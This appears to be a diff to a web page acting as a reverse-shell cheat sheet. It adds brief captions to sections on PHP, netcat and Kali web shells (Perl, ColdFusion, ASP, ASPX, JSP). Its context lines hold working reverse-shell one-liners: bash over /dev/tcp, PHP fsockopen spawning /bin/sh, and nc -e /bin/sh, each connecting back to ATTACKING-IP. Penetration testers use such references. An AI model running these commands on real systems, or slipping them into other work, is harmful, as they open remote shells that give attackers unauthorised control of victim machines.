@@ -68,12 +68,16 @@ bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
 
 ## PHP Reverse Shell
 
+A useful PHP reverse shell:
+
 {% highlight bash %}
 php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 (Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
 {% endhighlight %}
 
 ## Netcat Reverse Shell
+
+Useful netcat reverse shell examples:
 
 {% highlight bash %}
 nc -e /bin/sh ATTACKING-IP 80
@@ -165,6 +169,8 @@ The following shells exist within Kali Linux, under <code>/usr/share/webshells/<
 
 ### Kali PHP Web Shells
 
+Kali PHP reverse shells and command shells: 
+
 <div class="mobile-side-scroller">
 <table>
   <thead>
@@ -221,6 +227,8 @@ The following shells exist within Kali Linux, under <code>/usr/share/webshells/<
 
 ### Kali Perl Reverse Shell
 
+Kali perl reverse shell:
+
 <div class="mobile-side-scroller">
 <table>
   <thead>
@@ -252,6 +260,9 @@ The following shells exist within Kali Linux, under <code>/usr/share/webshells/<
 </div>
 
 ### Kali Cold Fusion Shell
+
+Kali Coldfusion Shell: 
+
 <div class="mobile-side-scroller">
 <table>
   <thead>
@@ -274,6 +285,9 @@ The following shells exist within Kali Linux, under <code>/usr/share/webshells/<
 </div>
 
 ### Kali ASP Shell
+
+Classic ASP Reverse Shell + CMD shells:
+
 <div class="mobile-side-scroller">
 <table>
   <thead>
@@ -296,6 +310,9 @@ The following shells exist within Kali Linux, under <code>/usr/share/webshells/<
 </div>
 
 ### Kali ASPX Shells
+
+ASP.NET reverse shells within Kali:
+
 <div class="mobile-side-scroller">
 <table>
   <thead>
@@ -318,6 +335,9 @@ The following shells exist within Kali Linux, under <code>/usr/share/webshells/<
 </div>
 
 ### Kali JSP Reverse Shell
+
+Kali JSP Reverse Shell:
+
 <div class="mobile-side-scroller">
 <table>
   <thead>
